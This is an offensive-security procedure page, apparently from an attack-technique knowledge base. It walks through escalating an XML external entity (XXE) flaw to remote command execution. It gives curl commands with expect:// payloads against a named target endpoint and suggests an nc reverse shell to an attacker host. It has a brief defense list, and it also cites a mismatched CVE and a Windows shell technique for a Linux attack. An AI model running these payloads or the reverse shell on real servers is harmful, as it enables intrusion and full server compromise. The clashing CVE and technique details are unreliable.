---
id: proc-uuid-9012
tags:
  - xxe
  - rce
  - command-execution
  - web
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-rce-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:27.408Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Achieve-RCE-via-XXE-Entity-Expansion

## Summary

This procedure escalates an XXE vulnerability to remote code execution by using advanced entity expansions, such as expect:// wrappers, to run arbitrary commands on the server, as demonstrated in the DoD website RCE (CVE-2017-3548).

## Description

Once XXE is confirmed, attackers can parameterize entities to invoke system commands via protocol wrappers supported by the XML processor (e.g., Java's expect for process execution). This targets web servers processing untrusted XML, allowing commands like 'id' or reverse shells. In the DoD case, this led to full server compromise. Prerequisites include confirmed XXE and knowledge of server tech stack (e.g., Java).

## Requirements

1. Verified XXE from prior disclosure
2. Access to send crafted XML payloads
3. Server supporting command wrappers (e.g., Linux with bash)

## Defense

Defensive measures and detection strategies:

- Whitelist allowed protocols in XML parsers and ban 'expect://' or 'java://'
- Implement input validation to strip DOCTYPE and entity definitions
- Log and alert on high-privilege command executions post-XML processing

## Objectives

1. Execute arbitrary OS commands
2. Gain shell access for persistence
3. Demonstrate full compromise potential

## Instructions

### Step 1: Test Command Execution with Simple Wrapper

**Context**: Use an expect entity to run a benign command and capture output.

**Command** ([[commands/curl-rce-payload]]):
```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "expect://id"> %xxe; ]><root></root>' http://target-dod-site.com/vulnerable-endpoint
```

> The parser executes 'id' via expect, embedding output in the entity. Response shows user context (e.g., www-data).

### Step 2: Escalate to Interactive Commands

**Context**: Chain commands or setup reverse shell for deeper access.

**Command** ([[commands/curl-rce-payload]]):
```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "expect://whoami"> %xxe; ]><root></root>' http://target-dod-site.com/vulnerable-endpoint
```

> Output reveals executing user. For shells, adapt payload to 'nc -e /bin/sh attacker-ip 4444' if netcat available.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-rce-payload]]

## Tools Used

- [[tools/curl]]

## Tags

- [[rce]]
- [[xxe]]
